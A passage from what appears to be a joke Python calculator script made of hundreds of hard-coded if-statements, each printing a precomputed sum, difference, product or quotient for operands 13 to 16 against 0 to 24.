13 and num_2 == 6 and calc == '-': print('13 - 6 = 7')\nif num_1 == 13 and num_2 == 6 and calc == '*': print('13 * 6 = 78')\nif num_1 == 13 and num_2 == 6 and calc == '/': print('13 / 6 = 2.1666666666666665')\nif num_1 == 13 and num_2 == 7 and calc == '+': print('13 + 7 = 20')\nif num_1 == 13 and num_2 == 7 and calc == '-': print('13 - 7 = 6')\nif num_1 == 13 and num_2 == 7 and calc == '*': print('13 * 7 = 91')\nif num_1 == 13 and num_2 == 7 and calc == '/': print('13 / 7 = 1.8571428571428572')\nif num_1 == 13 and num_2 == 8 and calc == '+': print('13 + 8 = 21')\nif num_1 == 13 and num_2 == 8 and calc == '-': print('13 - 8 = 5')\nif num_1 == 13 and num_2 == 8 and calc == '*': print('13 * 8 = 104')\nif num_1 == 13 and num_2 == 8 and calc == '/': print('13 / 8 = 1.625')\nif num_1 == 13 and num_2 == 9 and calc == '+': print('13 + 9 = 22')\nif num_1 == 13 and num_2 == 9 and calc == '-': print('13 - 9 = 4')\nif num_1 == 13 and num_2 == 9 and calc == '*': print('13 * 9 = 117')\nif num_1 == 13 and num_2 == 9 and calc == '/': print('13 / 9 = 1.4444444444444444')\nif num_1 == 13 and num_2 == 10 and calc == '+': print('13 + 10 = 23')\nif num_1 == 13 and num_2 == 10 and calc == '-': print('13 - 10 = 3')\nif num_1 == 13 and num_2 == 10 and calc == '*': print('13 * 10 = 130')\nif num_1 == 13 and num_2 == 10 and calc == '/': print('13 / 10 = 1.3')\nif num_1 == 13 and num_2 == 11 and calc == '+': print('13 + 11 = 24')\nif num_1 == 13 and num_2 == 11 and calc == '-': print('13 - 11 = 2')\nif num_1 == 13 and num_2 == 11 and calc == '*': print('13 * 11 = 143')\nif num_1 == 13 and num_2 == 11 and calc == '/': print('13 / 11 = 1.1818181818181819')\nif num_1 == 13 and num_2 == 12 and calc == '+': print('13 + 12 = 25')\nif num_1 == 13 and num_2 == 12 and calc == '-': print('13 - 12 = 1')\nif num_1 == 13 and num_2 == 12 and calc == '*': print('13 * 12 = 156')\nif num_1 == 13 and num_2 == 12 and calc == '/': print('13 / 12 = 1.0833333333333333')\nif num_1 == 13 and num_2 == 13 and calc == '+': print('13 + 13 = 26')\nif num_1 == 13 and num_2 == 13 and calc == '-': print('13 - 13 = 0')\nif num_1 == 13 and num_2 == 13 and calc == '*': print('13 * 13 = 169')\nif num_1 == 13 and num_2 == 13 and calc == '/': print('13 / 13 = 1.0')\nif num_1 == 13 and num_2 == 14 and calc == '+': print('13 + 14 = 27')\nif num_1 == 13 and num_2 == 14 and calc == '-': print('13 - 14 = -1')\nif num_1 == 13 and num_2 == 14 and calc == '*': print('13 * 14 = 182')\nif num_1 == 13 and num_2 == 14 and calc == '/': print('13 / 14 = 0.9285714285714286')\nif num_1 == 13 and num_2 == 15 and calc == '+': print('13 + 15 = 28')\nif num_1 == 13 and num_2 == 15 and calc == '-': print('13 - 15 = -2')\nif num_1 == 13 and num_2 == 15 and calc == '*': print('13 * 15 = 195')\nif num_1 == 13 and num_2 == 15 and calc == '/': print('13 / 15 = 0.8666666666666667')\nif num_1 == 13 and num_2 == 16 and calc == '+': print('13 + 16 = 29')\nif num_1 == 13 and num_2 == 16 and calc == '-': print('13 - 16 = -3')\nif num_1 == 13 and num_2 == 16 and calc == '*': print('13 * 16 = 208')\nif num_1 == 13 and num_2 == 16 and calc == '/': print('13 / 16 = 0.8125')\nif num_1 == 13 and num_2 == 17 and calc == '+': print('13 + 17 = 30')\nif num_1 == 13 and num_2 == 17 and calc == '-': print('13 - 17 = -4')\nif num_1 == 13 and num_2 == 17 and calc == '*': print('13 * 17 = 221')\nif num_1 == 13 and num_2 == 17 and calc == '/': print('13 / 17 = 0.7647058823529411')\nif num_1 == 13 and num_2 == 18 and calc == '+': print('13 + 18 = 31')\nif num_1 == 13 and num_2 == 18 and calc == '-': print('13 - 18 = -5')\nif num_1 == 13 and num_2 == 18 and calc == '*': print('13 * 18 = 234')\nif num_1 == 13 and num_2 == 18 and calc == '/': print('13 / 18 = 0.7222222222222222')\nif num_1 == 13 and num_2 == 19 and calc == '+': print('13 + 19 = 32')\nif num_1 == 13 and num_2 == 19 and calc == '-': print('13 - 19 = -6')\nif num_1 == 13 and num_2 == 19 and calc == '*': print('13 * 19 = 247')\nif num_1 == 13 and num_2 == 19 and calc == '/': print('13 / 19 = 0.6842105263157895')\nif num_1 == 13 and num_2 == 20 and calc == '+': print('13 + 20 = 33')\nif num_1 == 13 and num_2 == 20 and calc == '-': print('13 - 20 = -7')\nif num_1 == 13 and num_2 == 20 and calc == '*': print('13 * 20 = 260')\nif num_1 == 13 and num_2 == 20 and calc == '/': print('13 / 20 = 0.65')\nif num_1 == 13 and num_2 == 21 and calc == '+': print('13 + 21 = 34')\nif num_1 == 13 and num_2 == 21 and calc == '-': print('13 - 21 = -8')\nif num_1 == 13 and num_2 == 21 and calc == '*': print('13 * 21 = 273')\nif num_1 == 13 and num_2 == 21 and calc == '/': print('13 / 21 = 0.6190476190476191')\nif num_1 == 13 and num_2 == 22 and calc == '+': print('13 + 22 = 35')\nif num_1 == 13 and num_2 == 22 and calc == '-': print('13 - 22 = -9')\nif num_1 == 13 and num_2 == 22 and calc == '*': print('13 * 22 = 286')\nif num_1 == 13 and num_2 == 22 and calc == '/': print('13 / 22 = 0.5909090909090909')\nif num_1 == 13 and num_2 == 23 and calc == '+': print('13 + 23 = 36')\nif num_1 == 13 and num_2 == 23 and calc == '-': print('13 - 23 = -10')\nif num_1 == 13 and num_2 == 23 and calc == '*': print('13 * 23 = 299')\nif num_1 == 13 and num_2 == 23 and calc == '/': print('13 / 23 = 0.5652173913043478')\nif num_1 == 13 and num_2 == 24 and calc == '+': print('13 + 24 = 37')\nif num_1 == 13 and num_2 == 24 and calc == '-': print('13 - 24 = -11')\nif num_1 == 13 and num_2 == 24 and calc == '*': print('13 * 24 = 312')\nif num_1 == 13 and num_2 == 24 and calc == '/': print('13 / 24 = 0.5416666666666666')\nif num_1 == 14 and num_2 == 0 and calc == '+': print('14 + 0 = 14')\nif num_1 == 14 and num_2 == 0 and calc == '-': print('14 - 0 = 14')\nif num_1 == 14 and num_2 == 0 and calc == '*': print('14 * 0 = 0')\nif num_1 == 14 and num_2 == 0 and calc == '/': print('14 / 0 = Cannot divide by zero!')\nif num_1 == 14 and num_2 == 1 and calc == '+': print('14 + 1 = 15')\nif num_1 == 14 and num_2 == 1 and calc == '-': print('14 - 1 = 13')\nif num_1 == 14 and num_2 == 1 and calc == '*': print('14 * 1 = 14')\nif num_1 == 14 and num_2 == 1 and calc == '/': print('14 / 1 = 14.0')\nif num_1 == 14 and num_2 == 2 and calc == '+': print('14 + 2 = 16')\nif num_1 == 14 and num_2 == 2 and calc == '-': print('14 - 2 = 12')\nif num_1 == 14 and num_2 == 2 and calc == '*': print('14 * 2 = 28')\nif num_1 == 14 and num_2 == 2 and calc == '/': print('14 / 2 = 7.0')\nif num_1 == 14 and num_2 == 3 and calc == '+': print('14 + 3 = 17')\nif num_1 == 14 and num_2 == 3 and calc == '-': print('14 - 3 = 11')\nif num_1 == 14 and num_2 == 3 and calc == '*': print('14 * 3 = 42')\nif num_1 == 14 and num_2 == 3 and calc == '/': print('14 / 3 = 4.666666666666667')\nif num_1 == 14 and num_2 == 4 and calc == '+': print('14 + 4 = 18')\nif num_1 == 14 and num_2 == 4 and calc == '-': print('14 - 4 = 10')\nif num_1 == 14 and num_2 == 4 and calc == '*': print('14 * 4 = 56')\nif num_1 == 14 and num_2 == 4 and calc == '/': print('14 / 4 = 3.5')\nif num_1 == 14 and num_2 == 5 and calc == '+': print('14 + 5 = 19')\nif num_1 == 14 and num_2 == 5 and calc == '-': print('14 - 5 = 9')\nif num_1 == 14 and num_2 == 5 and calc == '*': print('14 * 5 = 70')\nif num_1 == 14 and num_2 == 5 and calc == '/': print('14 / 5 = 2.8')\nif num_1 == 14 and num_2 == 6 and calc == '+': print('14 + 6 = 20')\nif num_1 == 14 and num_2 == 6 and calc == '-': print('14 - 6 = 8')\nif num_1 == 14 and num_2 == 6 and calc == '*': print('14 * 6 = 84')\nif num_1 == 14 and num_2 == 6 and calc == '/': print('14 / 6 = 2.3333333333333335')\nif num_1 == 14 and num_2 == 7 and calc == '+': print('14 + 7 = 21')\nif num_1 == 14 and num_2 == 7 and calc == '-': print('14 - 7 = 7')\nif num_1 == 14 and num_2 == 7 and calc == '*': print('14 * 7 = 98')\nif num_1 == 14 and num_2 == 7 and calc == '/': print('14 / 7 = 2.0')\nif num_1 == 14 and num_2 == 8 and calc == '+': print('14 + 8 = 22')\nif num_1 == 14 and num_2 == 8 and calc == '-': print('14 - 8 = 6')\nif num_1 == 14 and num_2 == 8 and calc == '*': print('14 * 8 = 112')\nif num_1 == 14 and num_2 == 8 and calc == '/': print('14 / 8 = 1.75')\nif num_1 == 14 and num_2 == 9 and calc == '+': print('14 + 9 = 23')\nif num_1 == 14 and num_2 == 9 and calc == '-': print('14 - 9 = 5')\nif num_1 == 14 and num_2 == 9 and calc == '*': print('14 * 9 = 126')\nif num_1 == 14 and num_2 == 9 and calc == '/': print('14 / 9 = 1.5555555555555556')\nif num_1 == 14 and num_2 == 10 and calc == '+': print('14 + 10 = 24')\nif num_1 == 14 and num_2 == 10 and calc == '-': print('14 - 10 = 4')\nif num_1 == 14 and num_2 == 10 and calc == '*': print('14 * 10 = 140')\nif num_1 == 14 and num_2 == 10 and calc == '/': print('14 / 10 = 1.4')\nif num_1 == 14 and num_2 == 11 and calc == '+': print('14 + 11 = 25')\nif num_1 == 14 and num_2 == 11 and calc == '-': print('14 - 11 = 3')\nif num_1 == 14 and num_2 == 11 and calc == '*': print('14 * 11 = 154')\nif num_1 == 14 and num_2 == 11 and calc == '/': print('14 / 11 = 1.2727272727272727')\nif num_1 == 14 and num_2 == 12 and calc == '+': print('14 + 12 = 26')\nif num_1 == 14 and num_2 == 12 and calc == '-': print('14 - 12 = 2')\nif num_1 == 14 and num_2 == 12 and calc == '*': print('14 * 12 = 168')\nif num_1 == 14 and num_2 == 12 and calc == '/': print('14 / 12 = 1.1666666666666667')\nif num_1 == 14 and num_2 == 13 and calc == '+': print('14 + 13 = 27')\nif num_1 == 14 and num_2 == 13 and calc == '-': print('14 - 13 = 1')\nif num_1 == 14 and num_2 == 13 and calc == '*': print('14 * 13 = 182')\nif num_1 == 14 and num_2 == 13 and calc == '/': print('14 / 13 = 1.0769230769230769')\nif num_1 == 14 and num_2 == 14 and calc == '+': print('14 + 14 = 28')\nif num_1 == 14 and num_2 == 14 and calc == '-': print('14 - 14 = 0')\nif num_1 == 14 and num_2 == 14 and calc == '*': print('14 * 14 = 196')\nif num_1 == 14 and num_2 == 14 and calc == '/': print('14 / 14 = 1.0')\nif num_1 == 14 and num_2 == 15 and calc == '+': print('14 + 15 = 29')\nif num_1 == 14 and num_2 == 15 and calc == '-': print('14 - 15 = -1')\nif num_1 == 14 and num_2 == 15 and calc == '*': print('14 * 15 = 210')\nif num_1 == 14 and num_2 == 15 and calc == '/': print('14 / 15 = 0.9333333333333333')\nif num_1 == 14 and num_2 == 16 and calc == '+': print('14 + 16 = 30')\nif num_1 == 14 and num_2 == 16 and calc == '-': print('14 - 16 = -2')\nif num_1 == 14 and num_2 == 16 and calc == '*': print('14 * 16 = 224')\nif num_1 == 14 and num_2 == 16 and calc == '/': print('14 / 16 = 0.875')\nif num_1 == 14 and num_2 == 17 and calc == '+': print('14 + 17 = 31')\nif num_1 == 14 and num_2 == 17 and calc == '-': print('14 - 17 = -3')\nif num_1 == 14 and num_2 == 17 and calc == '*': print('14 * 17 = 238')\nif num_1 == 14 and num_2 == 17 and calc == '/': print('14 / 17 = 0.8235294117647058')\nif num_1 == 14 and num_2 == 18 and calc == '+': print('14 + 18 = 32')\nif num_1 == 14 and num_2 == 18 and calc == '-': print('14 - 18 = -4')\nif num_1 == 14 and num_2 == 18 and calc == '*': print('14 * 18 = 252')\nif num_1 == 14 and num_2 == 18 and calc == '/': print('14 / 18 = 0.7777777777777778')\nif num_1 == 14 and num_2 == 19 and calc == '+': print('14 + 19 = 33')\nif num_1 == 14 and num_2 == 19 and calc == '-': print('14 - 19 = -5')\nif num_1 == 14 and num_2 == 19 and calc == '*': print('14 * 19 = 266')\nif num_1 == 14 and num_2 == 19 and calc == '/': print('14 / 19 = 0.7368421052631579')\nif num_1 == 14 and num_2 == 20 and calc == '+': print('14 + 20 = 34')\nif num_1 == 14 and num_2 == 20 and calc == '-': print('14 - 20 = -6')\nif num_1 == 14 and num_2 == 20 and calc == '*': print('14 * 20 = 280')\nif num_1 == 14 and num_2 == 20 and calc == '/': print('14 / 20 = 0.7')\nif num_1 == 14 and num_2 == 21 and calc == '+': print('14 + 21 = 35')\nif num_1 == 14 and num_2 == 21 and calc == '-': print('14 - 21 = -7')\nif num_1 == 14 and num_2 == 21 and calc == '*': print('14 * 21 = 294')\nif num_1 == 14 and num_2 == 21 and calc == '/': print('14 / 21 = 0.6666666666666666')\nif num_1 == 14 and num_2 == 22 and calc == '+': print('14 + 22 = 36')\nif num_1 == 14 and num_2 == 22 and calc == '-': print('14 - 22 = -8')\nif num_1 == 14 and num_2 == 22 and calc == '*': print('14 * 22 = 308')\nif num_1 == 14 and num_2 == 22 and calc == '/': print('14 / 22 = 0.6363636363636364')\nif num_1 == 14 and num_2 == 23 and calc == '+': print('14 + 23 = 37')\nif num_1 == 14 and num_2 == 23 and calc == '-': print('14 - 23 = -9')\nif num_1 == 14 and num_2 == 23 and calc == '*': print('14 * 23 = 322')\nif num_1 == 14 and num_2 == 23 and calc == '/': print('14 / 23 = 0.6086956521739131')\nif num_1 == 14 and num_2 == 24 and calc == '+': print('14 + 24 = 38')\nif num_1 == 14 and num_2 == 24 and calc == '-': print('14 - 24 = -10')\nif num_1 == 14 and num_2 == 24 and calc == '*': print('14 * 24 = 336')\nif num_1 == 14 and num_2 == 24 and calc == '/': print('14 / 24 = 0.5833333333333334')\nif num_1 == 15 and num_2 == 0 and calc == '+': print('15 + 0 = 15')\nif num_1 == 15 and num_2 == 0 and calc == '-': print('15 - 0 = 15')\nif num_1 == 15 and num_2 == 0 and calc == '*': print('15 * 0 = 0')\nif num_1 == 15 and num_2 == 0 and calc == '/': print('15 / 0 = Cannot divide by zero!')\nif num_1 == 15 and num_2 == 1 and calc == '+': print('15 + 1 = 16')\nif num_1 == 15 and num_2 == 1 and calc == '-': print('15 - 1 = 14')\nif num_1 == 15 and num_2 == 1 and calc == '*': print('15 * 1 = 15')\nif num_1 == 15 and num_2 == 1 and calc == '/': print('15 / 1 = 15.0')\nif num_1 == 15 and num_2 == 2 and calc == '+': print('15 + 2 = 17')\nif num_1 == 15 and num_2 == 2 and calc == '-': print('15 - 2 = 13')\nif num_1 == 15 and num_2 == 2 and calc == '*': print('15 * 2 = 30')\nif num_1 == 15 and num_2 == 2 and calc == '/': print('15 / 2 = 7.5')\nif num_1 == 15 and num_2 == 3 and calc == '+': print('15 + 3 = 18')\nif num_1 == 15 and num_2 == 3 and calc == '-': print('15 - 3 = 12')\nif num_1 == 15 and num_2 == 3 and calc == '*': print('15 * 3 = 45')\nif num_1 == 15 and num_2 == 3 and calc == '/': print('15 / 3 = 5.0')\nif num_1 == 15 and num_2 == 4 and calc == '+': print('15 + 4 = 19')\nif num_1 == 15 and num_2 == 4 and calc == '-': print('15 - 4 = 11')\nif num_1 == 15 and num_2 == 4 and calc == '*': print('15 * 4 = 60')\nif num_1 == 15 and num_2 == 4 and calc == '/': print('15 / 4 = 3.75')\nif num_1 == 15 and num_2 == 5 and calc == '+': print('15 + 5 = 20')\nif num_1 == 15 and num_2 == 5 and calc == '-': print('15 - 5 = 10')\nif num_1 == 15 and num_2 == 5 and calc == '*': print('15 * 5 = 75')\nif num_1 == 15 and num_2 == 5 and calc == '/': print('15 / 5 = 3.0')\nif num_1 == 15 and num_2 == 6 and calc == '+': print('15 + 6 = 21')\nif num_1 == 15 and num_2 == 6 and calc == '-': print('15 - 6 = 9')\nif num_1 == 15 and num_2 == 6 and calc == '*': print('15 * 6 = 90')\nif num_1 == 15 and num_2 == 6 and calc == '/': print('15 / 6 = 2.5')\nif num_1 == 15 and num_2 == 7 and calc == '+': print('15 + 7 = 22')\nif num_1 == 15 and num_2 == 7 and calc == '-': print('15 - 7 = 8')\nif num_1 == 15 and num_2 == 7 and calc == '*': print('15 * 7 = 105')\nif num_1 == 15 and num_2 == 7 and calc == '/': print('15 / 7 = 2.142857142857143')\nif num_1 == 15 and num_2 == 8 and calc == '+': print('15 + 8 = 23')\nif num_1 == 15 and num_2 == 8 and calc == '-': print('15 - 8 = 7')\nif num_1 == 15 and num_2 == 8 and calc == '*': print('15 * 8 = 120')\nif num_1 == 15 and num_2 == 8 and calc == '/': print('15 / 8 = 1.875')\nif num_1 == 15 and num_2 == 9 and calc == '+': print('15 + 9 = 24')\nif num_1 == 15 and num_2 == 9 and calc == '-': print('15 - 9 = 6')\nif num_1 == 15 and num_2 == 9 and calc == '*': print('15 * 9 = 135')\nif num_1 == 15 and num_2 == 9 and calc == '/': print('15 / 9 = 1.6666666666666667')\nif num_1 == 15 and num_2 == 10 and calc == '+': print('15 + 10 = 25')\nif num_1 == 15 and num_2 == 10 and calc == '-': print('15 - 10 = 5')\nif num_1 == 15 and num_2 == 10 and calc == '*': print('15 * 10 = 150')\nif num_1 == 15 and num_2 == 10 and calc == '/': print('15 / 10 = 1.5')\nif num_1 == 15 and num_2 == 11 and calc == '+': print('15 + 11 = 26')\nif num_1 == 15 and num_2 == 11 and calc == '-': print('15 - 11 = 4')\nif num_1 == 15 and num_2 == 11 and calc == '*': print('15 * 11 = 165')\nif num_1 == 15 and num_2 == 11 and calc == '/': print('15 / 11 = 1.3636363636363635')\nif num_1 == 15 and num_2 == 12 and calc == '+': print('15 + 12 = 27')\nif num_1 == 15 and num_2 == 12 and calc == '-': print('15 - 12 = 3')\nif num_1 == 15 and num_2 == 12 and calc == '*': print('15 * 12 = 180')\nif num_1 == 15 and num_2 == 12 and calc == '/': print('15 / 12 = 1.25')\nif num_1 == 15 and num_2 == 13 and calc == '+': print('15 + 13 = 28')\nif num_1 == 15 and num_2 == 13 and calc == '-': print('15 - 13 = 2')\nif num_1 == 15 and num_2 == 13 and calc == '*': print('15 * 13 = 195')\nif num_1 == 15 and num_2 == 13 and calc == '/': print('15 / 13 = 1.1538461538461537')\nif num_1 == 15 and num_2 == 14 and calc == '+': print('15 + 14 = 29')\nif num_1 == 15 and num_2 == 14 and calc == '-': print('15 - 14 = 1')\nif num_1 == 15 and num_2 == 14 and calc == '*': print('15 * 14 = 210')\nif num_1 == 15 and num_2 == 14 and calc == '/': print('15 / 14 = 1.0714285714285714')\nif num_1 == 15 and num_2 == 15 and calc == '+': print('15 + 15 = 30')\nif num_1 == 15 and num_2 == 15 and calc == '-': print('15 - 15 = 0')\nif num_1 == 15 and num_2 == 15 and calc == '*': print('15 * 15 = 225')\nif num_1 == 15 and num_2 == 15 and calc == '/': print('15 / 15 = 1.0')\nif num_1 == 15 and num_2 == 16 and calc == '+': print('15 + 16 = 31')\nif num_1 == 15 and num_2 == 16 and calc == '-': print('15 - 16 = -1')\nif num_1 == 15 and num_2 == 16 and calc == '*': print('15 * 16 = 240')\nif num_1 == 15 and num_2 == 16 and calc == '/': print('15 / 16 = 0.9375')\nif num_1 == 15 and num_2 == 17 and calc == '+': print('15 + 17 = 32')\nif num_1 == 15 and num_2 == 17 and calc == '-': print('15 - 17 = -2')\nif num_1 == 15 and num_2 == 17 and calc == '*': print('15 * 17 = 255')\nif num_1 == 15 and num_2 == 17 and calc == '/': print('15 / 17 = 0.8823529411764706')\nif num_1 == 15 and num_2 == 18 and calc == '+': print('15 + 18 = 33')\nif num_1 == 15 and num_2 == 18 and calc == '-': print('15 - 18 = -3')\nif num_1 == 15 and num_2 == 18 and calc == '*': print('15 * 18 = 270')\nif num_1 == 15 and num_2 == 18 and calc == '/': print('15 / 18 = 0.8333333333333334')\nif num_1 == 15 and num_2 == 19 and calc == '+': print('15 + 19 = 34')\nif num_1 == 15 and num_2 == 19 and calc == '-': print('15 - 19 = -4')\nif num_1 == 15 and num_2 == 19 and calc == '*': print('15 * 19 = 285')\nif num_1 == 15 and num_2 == 19 and calc == '/': print('15 / 19 = 0.7894736842105263')\nif num_1 == 15 and num_2 == 20 and calc == '+': print('15 + 20 = 35')\nif num_1 == 15 and num_2 == 20 and calc == '-': print('15 - 20 = -5')\nif num_1 == 15 and num_2 == 20 and calc == '*': print('15 * 20 = 300')\nif num_1 == 15 and num_2 == 20 and calc == '/': print('15 / 20 = 0.75')\nif num_1 == 15 and num_2 == 21 and calc == '+': print('15 + 21 = 36')\nif num_1 == 15 and num_2 == 21 and calc == '-': print('15 - 21 = -6')\nif num_1 == 15 and num_2 == 21 and calc == '*': print('15 * 21 = 315')\nif num_1 == 15 and num_2 == 21 and calc == '/': print('15 / 21 = 0.7142857142857143')\nif num_1 == 15 and num_2 == 22 and calc == '+': print('15 + 22 = 37')\nif num_1 == 15 and num_2 == 22 and calc == '-': print('15 - 22 = -7')\nif num_1 == 15 and num_2 == 22 and calc == '*': print('15 * 22 = 330')\nif num_1 == 15 and num_2 == 22 and calc == '/': print('15 / 22 = 0.6818181818181818')\nif num_1 == 15 and num_2 == 23 and calc == '+': print('15 + 23 = 38')\nif num_1 == 15 and num_2 == 23 and calc == '-': print('15 - 23 = -8')\nif num_1 == 15 and num_2 == 23 and calc == '*': print('15 * 23 = 345')\nif num_1 == 15 and num_2 == 23 and calc == '/': print('15 / 23 = 0.6521739130434783')\nif num_1 == 15 and num_2 == 24 and calc == '+': print('15 + 24 = 39')\nif num_1 == 15 and num_2 == 24 and calc == '-': print('15 - 24 = -9')\nif num_1 == 15 and num_2 == 24 and calc == '*': print('15 * 24 = 360')\nif num_1 == 15 and num_2 == 24 and calc == '/': print('15 / 24 = 0.625')\nif num_1 == 16 and num_2 == 0 and calc == '+': print('16 + 0 = 16')\nif num_1 == 16 and num_2 == 0 and calc == '-': print('16 - 0 = 16')\nif num_1 == 16 and num_2 == 0 and calc == '*': print('16 * 0 = 0')\nif num_1 == 16 and num_2 == 0 and calc == '/': print('16 / 0 = Cannot divide by zero!')\nif num_1 == 16 and num_2 == 1 and calc == '+': print('16 + 1 = 17')\nif num_1 == 16 and num_2 == 1 and calc == '-': print('16 - 1 = 15')\nif num_1 == 16 and num_2 == 1 and calc == '*': print('16 * 1 = 16')\nif num_1 == 16 and num_2 == 1 and calc == '/': print('16 / 1 = 16.0')\nif num_1 == 16 and num_2 == 2 and calc == '+': print('16 + 2 = 18')\nif num_1 == 16 and num_2 == 2 and calc == '-': print('16 - 2 = 14')\nif num_1 == 16 and num_2 == 2 and calc == '*': print('16 * 2 = 32')\nif num_1 == 16 and num_2 == 2 and calc == '/': print('16 / 2 = 8.0')\nif num_1 == 16 and num_2 == 3 and calc == '+': print('16 + 3 = 19')\nif num_1 == 16 and num_2 == 3 and calc == '-': print('16 - 3 = 13')\nif num_1 == 16 and num_2 == 3 and calc == '*': print('16 * 3 = 48')\nif num_1 == 16 and num_2 == 3 and calc == '/': print('16 / 3 = 5.333333333333333')\nif num_1 == 16 and num_2 == 4 and calc == '+': print('16 + 4 = 20')\nif num_1 == 16 and num_2 == 4 and calc == '-': print('16 - 4 = 12')\nif num_1 == 16 and num_2 == 4 and calc == '*': print('16 * 4 = 64')\nif num_1 == 16 and num_2 == 4 and calc == '/': print('16 / 4 = 4.0')\nif num_1 == 16 and num_2 == 5 and calc == '+': print('16 + 5 = 21')\nif num_1 == 16 and num_2 == 5 and calc == '-': print('16 - 5 = 11')\nif num_1 == 16 and num_2 == 5 and calc == '*': print('16 * 5 = 80')\nif num_1 == 16 and num_2 == 5 and calc == '/': print('16 / 5 = 3.2')\nif num_1 == 16 and num_2 == 6 and calc == '+': print('16 + 6 = 22')\nif num_1 == 16 and num_2 == 6 and calc == '-': print('16 - 6 = 10')\nif num_1 == 16 and num_2 == 6 and calc == '*': print('16 * 6 = 96')\nif num_1 == 16 and num_2 == 6 and calc == '/': print('16 / 6 = 2.6666666666666665')\nif num_1 == 16 and num_2 == 7 and calc == '+': print('16 + 7 = 23')\nif num_1 == 16 and num_2 == 7 and calc == '-': print('16 - 7 = 9')\nif num_1 == 16 and num_2 == 7 and calc == '*': print('16 * 7 = 112')\nif num_1 == 16 and num_2 == 7 and calc == '/': print('16 / 7 = 2.2857142857142856')\nif num_1 == 16 and num_2 == 8 and calc == '+': print('16 + 8 = 24')\nif num_1 == 16 and num_2 == 8 and calc == '-': print('16 - 8 = 8')\nif num_1 == 16 and num_2 == 8 and calc == '*': print('16 * 8 = 128')\nif num_1 == 16 and num_2 == 8 and calc == '/': print('16 / 8 = 2.0')\nif num_1 == 16 and num_2 == 9 and calc == '+': print('16 + 9 = 25')\nif num_1 == 16 and num_2 == 9 and calc == '-': print('16 - 9 = 7')\nif num_1 == 16 and num_2 == 9 and calc == '*': print('16 * 9 = 144')\nif num_1 == 16 and num_2 == 9 and calc == '/': print('16 / 9 = 1.7777777777777777')\nif num_1 == 16 and num_2 == 10 and calc == '+': print('16 + 10 = 26')\nif num_1 == 16 and num_2 == 10 and calc == '-': print('16 - 10 = 6')\nif num_1 == 16 and num_2 == 10 and calc == '*': print('16 * 10 = 160')\nif num_1 == 16 and num_2 == 10 and calc == '/': print('16 / 10 = 1.6')\nif num_1 == 16 and num_2 == 11 and calc == '+': print('16 + 11 = 27')\nif num_1 == 16 and num_2 == 11 and calc == '-': print('16 - 11 = 5')\nif num_1 == 16 and num_2 == 11 and calc == '*': print('16 * 11 = 176')\nif num_1 == 16 and num_2 == 11 and calc == '/': print('16 / 11 = 1.4545454545454546')\nif num_1 == 16 and num_2 == 12 and calc == '+': print('16 + 12 = 28')\nif num_1 == 16 and num_2 == 12 and calc == '-': print('16 - 12 = 4')\nif num_1 == 16 and num_2 == 12 and calc == '*': print('16 * 12 = 192')\nif num_1 == 16 and num_2 == 12 and calc == '/': print('16 / 12 = 1.3333333333333333')\nif num_1 == 16 and num_2 == 13 and calc == '+': print('16 + 13 = 29')\nif num_1 == 16 and num_2 == 13 and calc == '-': print('16 - 13 = 3')\nif num_1 == 16 and num_2 == 13 and calc == '*': print('16 * 13 = 208')\nif num_1 == 16 and num_2 == 13 and calc == '/': print('16 / 13 = 1.2307692307692308')\nif num_1 == 16 and num_2 == 14 and calc == '+': print('16 + 14 = 30')\nif num_1 == 16 and num_2 == 14 and calc == '-': print('16 - 14 = 2')\nif num_1 == 16 and num_2 == 14 and calc == '*': print('16 * 14 = 224')\nif num_1 == 16 and num_2 == 14 and calc == '/': print('16 / 14 = 1.1428571428571428')\nif num_1 == 16 and num_2 == 15 and calc == '+': print('16 + 15 = 31')\nif num_1 == 16 and num_2 == 15 and calc == '-': print('16 - 15 = 1')\nif num_1 == 16 and num_2 == 15 and calc == '*': print('16 * 15 = 240')\nif num_1 == 16 and num_2 == 15 and calc == '/': print('16 / 15 = 1.0666666666666667')\nif num_1 == 16 and num_2 == 16 and calc == '+': print('16 + 16 = 32')\nif num_1 == 16 and num_2 == 16 and calc == '-': print('16 - 16 = 0')\nif num_1 == 16 and num_2 == 16 and calc == '*': print('16 * 16 = 256')\nif num_1 == 16 and num_2 == 16 and calc == '/': print('16 / 16 = 1.0')\nif num_1 == 16 and num_2 == 17 and calc == '+': print('16 + 17 = 33')\nif num_1 == 16 and num_2 == 17 and calc == '-': print('16 - 17 = -1')\nif num_1 == 16 and num_2 == 17 and calc == '*': print('16 * 17 = 272')\nif num_1 == 16 and num_2 == 17 and calc == '/': print('16 / 17 = 0.9411764705882353')\nif num_1 == 16 and num_2 == 18 and calc == '+': print('16 + 18 = 34')\nif num_1 == 16 and num_2 == 18 and calc == '-': print('16 - 18 = -2')\nif num_1 == 16 and num_2 == 18 and calc == '*': print('16 * 18 = 288')\nif num_1 == 16 and num_2 == 18 and calc == '/': print('16 / 18 = 0.8888888888888888')\nif num_1 == 16 and num_2 == 19 and calc == '+': print('16 + 19 = 35')\nif num_1 == 16 and num_2 == 19 and calc == '-': print('16 - 19 = -3')\nif num_1 == 16 and num_2 == 19 and calc == '*': print('16 * 19 = 304')\nif num_1 == 16 and num_2 == 19 and calc == '/': print('16 / 19 = 0.8421052631578947')\nif num_1 == 16 and num_2 == 20 and calc == '+': print('16 + 20 = 36')\nif num_1 == 16 and num_2 == 20 and calc == '-': print('16 - 20 = -4')\nif num_1 == 16 and num_2 == 20 and calc == '*': print('16 * 20 = 320')\nif num_1 == 16 and num_2 == 20 and calc == '/': print('16 / 20 = 0.8')\nif num_1 == 16 and num_2 == 21 and calc == '+': print('16 + 21 = 37')\nif num_1 == 16 and num_2 == 21 and calc == '-': print('16 - 21 = -5')\nif num_1 == 16 and num_2 == 21 and calc == '*': print('16 * 21 = 336')\nif num_1 == 16 and num_2 == 21 and calc == '/': print('16 / 21 = 0.7619047619047619')\nif num_1 == 16 and num_2 == 22 and calc == '+': print('16 + 22 = 38')\nif num_1 == 16 and num_2 == 22 and calc == '-': print('16 - 22 = -6')\nif num_1 == 16 and num_2 == 22 and calc == '*': print('16 * 22 = 352')\nif num_1 == 16 and num_2 == 22 and calc == '/': print('16 / 22 = 0.7272727272727273')\nif num_1 == 16 and num_2 == 23 and calc == '+': print('16 + 23 = 39')\nif num_1 == 16 and num_2 == 23 and calc == '-': print('16 - 23 = -7')\nif num_1 == 16 and num_2 == 23 and calc == '*': print('16 * 23 = 368')\nif num_1 == 16 and num_2 == 23 and calc == '/': print('16 / 23 = 0.6956521739130435')\nif num_1 == 16 and num_2 == 24 and calc == '+': print('16 + 24 = 40')\nif num_1 == 16 and num_2 == 24 and calc == '-': 